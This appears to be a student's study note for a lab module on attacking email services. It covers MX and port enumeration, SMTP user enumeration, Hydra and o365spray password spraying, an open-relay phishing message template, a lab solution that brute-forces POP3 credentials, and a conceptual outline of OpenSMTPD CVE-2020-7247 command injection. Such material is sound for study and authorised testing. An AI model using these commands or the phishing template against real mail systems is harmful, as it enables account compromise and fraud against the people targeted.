### Attacking Email Services

```
# When we press the Send button in our email application (email client), 
# the program establishes a connection to an SMTP server on the network or Internet. 

# The name SMTP stands for Simple Mail Transfer Protocol, 
# and it is a protocol for delivering emails from clients to servers and from servers to other servers.

# When we download emails to our email application, it will connect to a POP3 or IMAP4 server on the Internet, 
# which allows the user to save messages in a server mailbox and download them periodically.
```

### Enumeration

```
# We can use the Mail eXchanger (MX) DNS record to identify a mail server. 
# The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. 
# It is possible to configure several MX records, typically pointing to an array of 
# mail servers for load balancing and redundancy.

# We can use tools such as host or dig and online websites such as MXToolbox to query information about the MX records:

host -t MX hackthebox.eu                               # Host - MX Records
host -t MX microsoft.com                     

dig mx plaintext.do | grep "MX" | grep -v ";"          # DIG - MX Records
dig mx inlanefreight.com | grep "MX" | grep -v ";"

host -t A mail1.inlanefreight.htb.                     # Host - A Records
```

```
# If we are targetting a custom mail server implementation 
# such as inlanefreight.htb, we can enumerate the following ports:
P
Port      Service
TCP/25 	  SMTP Unencrypted
TCP/143 	IMAP4 Unencrypted
TCP/110 	POP3 Unencrypted
TCP/465 	SMTP Encrypted
TCP/587 	SMTP Encrypted/STARTTLS
TCP/993 	IMAP4 Encrypted
TCP/995 	POP3 Encrypted
```

```
We can use Nmap's default script -sC option to enumerate those ports on the target system:

sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

### Misconfigurations

```
# Email services use authentication to allow users to send emails and receive emails. 
# A misconfiguration can happen when the SMTP service allows anonymous authentication or 
# support protocols that can be used to enumerate valid usernames.
```

```
# Authentication

# The SMTP server has different commands that can be used to enumerate valid usernames 
## VRFY, EXPN, and RCPT TO. 
# If we successfully enumerate valid usernames, we can attempt to password spray, 
# brute-forcing, or guess a valid password. 
```

```
# VRFY 
# this command instructs the receiving SMTP server to check the validity of a particular email username. 
# The server will respond, indicating if the user exists or not. This feature can be disabled.

[smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)

```
# To automate our enumeration process, we can use a tool named smtp-user-enum. 
# We can specify the enumeration mode with the argument -M followed by VRFY, EXPN, or RCPT, 
# and the argument -U with a file containing the list of users we want to enumerate. 
# Depending on the server implementation and enumeration mode, 
# we need to add the domain for the email address with the argument -D. Finally, we specify the target with the argument -t.

smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

### Cloud Enumeration

[o365spray](https://github.com/0xZDH/o365spray)

```
# O365spray is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by ZDH. 
# This tool reimplements a collection of enumeration and spray techniques 
# researched and identified by those mentioned in Acknowledgments. 
# Let's first validate if our target domain is using Office 365.

python3 o365spray.py --validate --domain msplaintext.xyz               # Validate domain
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz      # Attempt to identify usernames
```

### Password Attacks

```
# We can use Hydra to perform a password spray or brute force against email services such as SMTP, POP3, or IMAP4.

hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3                 # POP3 example
```

```
# If cloud services support SMTP, POP3, or IMAP4 protocols, 
# we may be able to attempt to perform password spray using tools like Hydra, 
# but these tools are usually blocked. 
# We can instead try to use custom tools such as o365spray or MailSniper for Office 365 or CredKing for Gmail or Okta.
```

### O365 Spray - Password Spraying

```
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

### Protocol Specifics Attacks

```
# An open relay is a Simple Mail Transfer Protocol (SMTP) server, 
# which is improperly configured and allows an unauthenticated email relay. 
# Messaging servers that are accidentally or intentionally configured as open relays 
# allow mail from any source to be transparently re-routed through the open relay server.
```

```
# Open Relay

# From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users 
# or spoofing someone else's email. 

# For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email 
# address to send notifications to their employees. 

# We can send a similar email using the same address and add our phishing link with this information. 
# With the nmap smtp-open-relay script, we can identify if an SMTP port allows an open relay.

nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

```
# Next, we can use any mail client to connect to the mail server and send our email.

--from notifications@inlanefreight.com \
--to employees@inlanefreight.com \
--header 'Subject: Company Notification' \
--body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' \

```

### Task Solution

sudo nmap -A 10.129.225.161                           # Check maiil services by all possible ports 
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995    # Check maiil services by mail ports 

smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12  # Using tool to grab name, found.

hydra -l marlin@inlanefreight.htb -P pws.list -f 10.129.203.12 pop3         # Found users creds with hydra and pop3

telnet 10.129.203.12 110                              # Login to target host wit pop3 port

### Latest Email Service Vulnerabilities

[CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247)

```
# One of the most recent publicly disclosed and dangerous Simple Mail Transfer Protocol (SMTP) vulnerabilities 
# was discovered in OpenSMTPD up to version 6.6.2 service was in 2020. 
# This vulnerability was assigned CVE-2020-7247 and leads to RCE. 
# It has been exploitable since 2018. 

# According to Shodan.io, at the time of writing (April 2022), 
# there are over 5,000 publicly accessible OpenSMTPD servers worldwide, and the trend is growing. 
```

[Shodan.io](https://www.shodan.io/)

```
# The Concept of the Attack

# As we already know, with the SMTP service, we can compose emails and send them to desired people. 
# The vulnerability in this service lies in the program's code, namely in the function that records the sender's email address.
# This offers the possibility of escaping the function using a semicolon (;)
#  and making the system execute arbitrary shell commands. 

# However, there is a limit of 64 characters, which can be inserted as a command. 
# The technical details of this vulnerability can be found here.
```

[here](https://www.openwall.com/lists/oss-security/2020/01/28/3)

[On exploit DB](https://www.exploit-db.com/exploits/47984)

```
# Here we need to initialize a connection with the SMTP service first. 
# This can be automated by a script or entered manually. 
# After the connection is established, an email must be composed in which we define the sender, 
# the recipient, and the actual message for the recipient. 
# The desired system command is inserted in the sender field connected 
# to the sender address with a semicolon (;). 
# As soon as we finish writing, the data entered is processed by the OpenSMTPD process.
```
